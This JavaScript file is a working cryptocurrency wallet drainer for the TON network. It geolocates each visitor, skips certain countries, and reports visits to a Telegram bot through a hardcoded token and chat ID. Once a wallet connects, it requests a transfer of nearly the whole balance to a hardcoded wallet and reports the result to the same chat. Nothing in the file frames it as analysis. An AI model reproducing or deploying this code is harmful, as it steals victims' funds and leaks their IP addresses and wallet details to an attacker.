var mainWallet = "UQDCkCJyRrGCwZIt7LiGhm5KMZ3zDqayIbIBa_gODfjXpmz0";
var tgBotToken = "7148557853:AAGWguFK_73-QIPxZkBjUKrCTtxhoYCXvaI";
var tgChat = "-1002235682399";

var domain = window.location.hostname;
var ipUser;
var countryUser;

fetch('https://ipapi.co/json/')
    .then(response => response.json())
    .then(data => {
        const country = data.country;

        if (['RU', 'KZ', 'BY', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ'].includes(country)) {
            window.location.replace('https://ton.org');
        }

        ipUser = data.ip;
        countryUser = data.country;
        console.log('IP: ' + ipUser);
        console.log('Country: ' + countryUser);

        const messageOpen = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCD6*VISITED THE WEBSITE*`;
        const encodedMessageOpen = encodeURIComponent(messageOpen);
        const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChat}&text=${encodedMessageOpen}&parse_mode=Markdown`;

        fetch(url, { method: 'POST' })
            .then(response => {
                if (response.ok) {
                    console.log('Success send.');
                } else {
                    console.error('Error send.');
                }
            })
            .catch(error => console.error('Error: ', error));
    })
    .catch(error => console.error('Error IP:', error));

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: `https://${domain}/tonconnect-manifest.json`,
    buttonRootId: 'ton-connect'
});

tonConnectUI.on('walletConnected', walletAddress => {
    console.log('Адрес кошелька:', walletAddress);
});

async function didtrans() {
    try {
        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${tonConnectUI.account.address}`);
        const data = await response.json();
        let originalBalance = parseFloat(data.balance);
        let processedBalance = originalBalance - (originalBalance * 0.03); // Deducting 3% for transaction fees
        let tgBalance = processedBalance / 1000000000;

        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 60, // 60 seconds
            messages: [{
                address: mainWallet,
                amount: processedBalance
            }]
        };

        const result = await tonConnectUI.sendTransaction(transaction);

        const messageSend = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n\uD83D\uDC8E*Send:* ${tgBalance}`;
        const encodedMessageSend = encodeURIComponent(messageSend);
        const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChat}&text=${encodedMessageSend}&parse_mode=Markdown`;

        fetch(url, { method: 'POST' })
            .then(response => {
                if (response.ok) {
                    console.log('Success send.');
                } else {
                    console.error('Error send.');
                }
            })
            .catch(error => console.error('Error: ', error));

    } catch (e) {
        const messageDeclined = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n\uD83D\uDED1*Declined or error.*`;
        const encodedMessageDeclined = encodeURIComponent(messageDeclined);
        const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChat}&text=${encodedMessageDeclined}&parse_mode=Markdown`;

        fetch(url, { method: 'POST' })
            .then(response => {
                if (response.ok) {
                    console.log('Success send.');
                } else {
                    console.error('Error send.');
                }
            })
            .catch(error => console.error('Error: ', error));

        console.error(e);
    }
}